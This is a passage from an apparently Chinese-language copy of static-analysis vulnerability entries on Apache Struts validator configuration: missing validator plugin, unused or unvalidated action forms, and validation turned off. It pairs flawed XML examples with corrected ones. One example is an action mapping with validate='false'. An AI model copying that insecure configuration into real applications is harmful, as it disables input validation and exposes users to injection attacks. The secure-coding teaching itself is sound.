&lt;var-value&gt;12&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">  &lt;var&gt;</span><br><span class="line"></span><br><span class="line">      &lt;var-name&gt;mask&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">      &lt;var-value&gt;^[0-9a-zA-Z]*$&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">&lt;/field&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-333"><a href="#REFERENCES-333" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 105</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-Plugin-Framework-Not-In-Use"><a href="#Struts-Plugin-Framework-Not-In-Use" class="headerlink" title="Struts: Plugin Framework Not In Use"></a>Struts: Plugin Framework Not In Use</h4><h5 id="ABSTRACT-336"><a href="#ABSTRACT-336" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 Struts Validator 来预防由未验证的输入导致的漏洞。</p>
<h5 id="EXPLANATION-336"><a href="#EXPLANATION-336" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 J2EE 应用程序中，未经检验的输入是导致漏洞发生的首要原因。未经检验的输入数据会导致许多漏洞，如 cross-site scripting、process control 和 SQL injection。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<p>为了防止此类攻击，应当先使用 Struts Validator 来检验所有输入程序的数据，然后再由应用程序处理这些数据。使用 Fortify Static Code Analyzer（Fortify 静态代码分析器）来确保您的 Struts Validator 配置中不存在任何漏洞。</p>
<p>验证器在例子中的用法包括检查并确保以下内容：</p>
<ul>
<li><p>在电话号码字段中只包含有效字符</p>
</li>
<li><p>布尔值仅为 “T” 或者 “F”</p>
</li>
<li><p>未限定格式的字符串必须具有合理的长度，并且由有效的字符组成</p>
</li>
</ul>
<h5 id="RECOMMENDATIONS-335"><a href="#RECOMMENDATIONS-335" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在您的 Struts 配置文件中启用 Struts Validator。以下示例说明了一种典型设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;plug-in className=&quot;org.apache.struts.validator.ValidatorPlugIn&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;set-property property=&quot;pathnames&quot;</span><br><span class="line"></span><br><span class="line">        value=&quot;/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/plug-in&gt;</span><br></pre></td></tr></table></figure>
<p>配置文件 validator-rules.xml 包含了对验证函数（称为验证器）的定义。配置文件 validation.xml 中定义了每个表单和每个表单字段所使用的验证器。</p>
<p>所有操作映射所使用的表单都必须真实存在，并且对所有表单参数都应进行验证。</p>
<h5 id="REFERENCES-334"><a href="#REFERENCES-334" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts Project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 106</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-Unused-Action-Form"><a href="#Struts-Unused-Action-Form" class="headerlink" title="Struts: Unused Action Form"></a>Struts: Unused Action Form</h4><h5 id="ABSTRACT-337"><a href="#ABSTRACT-337" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>unused action form 表明应用程序逻辑可能已经过时。</p>
<h5 id="EXPLANATION-337"><a href="#EXPLANATION-337" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 使用 form-bean 条目将 HTML 形式映射至操作。如果 Struts 配置文件的 <code>&lt;action-mappings&gt;</code>元素中不包含与 <code>&lt;form-bean&gt;</code> 标签定义的相关 action form 对应的项，应用程序逻辑可能已经过时。</p>
<p>例 1：以下配置不包含 bean2 的映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;bean1&quot; type=&quot;coreservlets.UserFormBean1&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;bean2&quot; type=&quot;coreservlets.UserFormBean2&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;action-mappings&gt;</span><br><span class="line"></span><br><span class="line">  &lt;action path=&quot;/actions/register1&quot; type=&quot;coreservlets.RegisterAction1&quot; name=&quot;bean1&quot; scope=&quot;request&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action-mappings&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-336"><a href="#RECOMMENDATIONS-336" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保存在一个 action 条目，并且该条目与 <code>&lt;form-bean&gt;</code> 标签中发现的每个 name 属性相对应。</p>
<p>例 2：以下配置包含 bean1 和 bean2 的正确映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;bean1&quot; type=&quot;coreservlets.UserFormBean&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;bean2&quot; type=&quot;coreservlets.UserFormBean&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;action-mappings&gt;</span><br><span class="line"></span><br><span class="line">  &lt;action path=&quot;/actions/register1&quot; type=&quot;coreservlets.RegisterAction1&quot; name=&quot;bean1&quot; scope=&quot;request&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;action path=&quot;/actions/register2&quot; type=&quot;coreservlets.RegisterAction2&quot; name=&quot;bean2&quot; scope=&quot;request&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action-mappings&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-335"><a href="#REFERENCES-335" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 1.3 Specification</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[3] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[4] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[5] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-Unused-Validation-Form"><a href="#Struts-Unused-Validation-Form" class="headerlink" title="Struts: Unused Validation Form"></a>Struts: Unused Validation Form</h4><h5 id="ABSTRACT-338"><a href="#ABSTRACT-338" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>unused validation form 暗示着验证逻辑已经过时。</p>
<h5 id="EXPLANATION-338"><a href="#EXPLANATION-338" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当开发人员删除或者重命名 action form 映射后，很容易忘记更新验证逻辑。验证逻辑没有得到适当维护的一个迹象是存在 unused validation form。</p>
<h5 id="RECOMMENDATIONS-337"><a href="#RECOMMENDATIONS-337" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>通过验证逻辑查找是否存在其他或许更难察觉的问题。</p>
<p>－ 如果 validation form 先前被一个 action form 映射调用过，而这个映射 目前已经删除了，则应删除这个 unused validation form。</p>
<p>－ 如果该 action form 映射已经被重命名，请考虑重命名验证 表单，让它们重新连接起来。</p>
<p>－ 如果旧的 action form 映射中存在的功能已经合并到 另一个 action form 映射中，请检查无用的验证逻辑与新的 验证逻辑之间的一致性。</p>
<h5 id="REFERENCES-336"><a href="#REFERENCES-336" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 107</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-Unvalidated-Action-Form"><a href="#Struts-Unvalidated-Action-Form" class="headerlink" title="Struts: Unvalidated Action Form"></a>Struts: Unvalidated Action Form</h4><h5 id="ABSTRACT-339"><a href="#ABSTRACT-339" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>每个 Action Form 必须具有一个对应的 validation form。</p>
<h5 id="EXPLANATION-339"><a href="#EXPLANATION-339" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果某个 Struts Action Form 映射指定了一个表单，它必须具有一个在 Struts Validator 下定义的 validation form。如果某个 Action Form 映射没有定义的 validation form，它可能极易受到那些利用未经检验的输入发起的攻击。</p>
<p>未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<p>虽然一个操作或表单可以通过别的方法执行验证，但是 Struts Validator 提供了一种极好的方法，来验证所有输入是否至少接受了最基础的检验。如果不使用这种方法，想要建立一个所有输入都经过验证的高级别信任度是一件非常困难、甚至不可能的事情。</p>
<h5 id="RECOMMENDATIONS-338"><a href="#RECOMMENDATIONS-338" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>下面的例子说明了如何使用 Struts validation form 对一个简单表单的输入执行健全性检查。在这个例子中，表单只接受一个名为 “passwd” 的参数。验证逻辑用于检测 “passwd” 参数的字符长度是否在 6 到 12 之间，以及是否只包含字母或数字字符。</p>
<p>在 struts-config.xml 文件中，应用程序定义了表单 bean 和操作映射：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;struts-config&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form-bean name=&quot;passwdForm&quot;</span><br><span class="line"></span><br><span class="line">                   type=&quot;com.bonsecure.form.PasswordForm&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form-beans&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;action-mappings&gt;</span><br><span class="line"></span><br><span class="line">    &lt;action</span><br><span class="line"></span><br><span class="line">        path=&quot;/app/login&quot;</span><br><span class="line"></span><br><span class="line">        type=&quot;com.bonsecure.ssm.action.LoginAction&quot;</span><br><span class="line"></span><br><span class="line">        name=&quot;passwdForm&quot;</span><br><span class="line"></span><br><span class="line">        scope=&quot;request&quot;</span><br><span class="line"></span><br><span class="line">        validate=&quot;true&quot;</span><br><span class="line"></span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action-mappings&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/struts-config&gt;</span><br></pre></td></tr></table></figure>
<p>在 validation.xml 文件中，应用程序定义了针对 bean 的 validation form：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-validation&gt;</span><br><span class="line"></span><br><span class="line">&lt;formset&gt;</span><br><span class="line"></span><br><span class="line">&lt;form name=&quot;passwdForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;field property=&quot;passwd&quot; depends=&quot;minlength, maxlength, mask&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;arg0 key=&quot;label.user.passwd&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;arg1 name=&quot;minlength&quot; key=&quot;$&#123;var:minlength&#125;&quot;</span><br><span class="line"></span><br><span class="line">              resource=&quot;false&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;arg2 name=&quot;maxlength&quot; key=&quot;$&#123;var:maxlength&#125;&quot;</span><br><span class="line"></span><br><span class="line">                  resource=&quot;false&quot;/&gt;</span><br><span class="line"></span><br><span class="line">         &lt;var&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-name&gt;min&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-value&gt;6&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">         &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">         &lt;var&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-name&gt;max&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-value&gt;12&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">         &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">         &lt;var&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-name&gt;mask&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-value&gt;^[0-9a-zA-Z]+$&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">         &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/field&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/formset&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-validation&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-337"><a href="#REFERENCES-337" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 108</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-Validator-Turned-Off"><a href="#Struts-Validator-Turned-Off" class="headerlink" title="Struts: Validator Turned Off"></a>Struts: Validator Turned Off</h4><h5 id="ABSTRACT-340"><a href="#ABSTRACT-340" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>这个 action form 映射禁用了表单的 validate() 方法。</p>
<h5 id="EXPLANATION-340"><a href="#EXPLANATION-340" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>action form 映射永远不应该禁用验证。禁用验证的同时也就禁用了 Struts Validator，一并还有所有由表单执行的自定义验证逻辑。</p>
<p>示例：一个禁用了验证的 action form 映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;action path=&quot;/download&quot;</span><br><span class="line"></span><br><span class="line">type=&quot;com.website.d2.action.DownloadAction&quot;</span><br><span class="line"></span><br><span class="line">name=&quot;downloadForm&quot;</span><br><span class="line"></span><br><span class="line">scope=&quot;request&quot;</span><br><span class="line"></span><br><span class="line">input=&quot;.download&quot;</span><br><span class="line"></span><br><span class="line">validate=&quot;false&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action&gt;</span><br></pre></td></tr></table></figure>
<p>禁用验证会使该操作暴露在各种攻击之下。未经校验的输入是导致各种漏洞的根源，如 cross-site scripting、process control 和 SQL injection。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-339"><a href="#RECOMMENDATIONS-339" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>默认情况下会启用验证，因此您不需要直接设置验证属性，如果已经设置，应删除它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;action path=&quot;/download&quot;</span><br><span class="line"></span><br><span class="line">type=&quot;com.website.d2.action.DownloadAction&quot;</span><br><span class="line"></span><br><span class="line">name=&quot;downloadForm&quot;</span><br><span class="line"></span><br><span class="line">scope=&quot;request&quot;</span><br><span class="line"></span><br><span class="line">input=&quot;.download&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-338"><a href="#REFERENCES-338" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 109</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
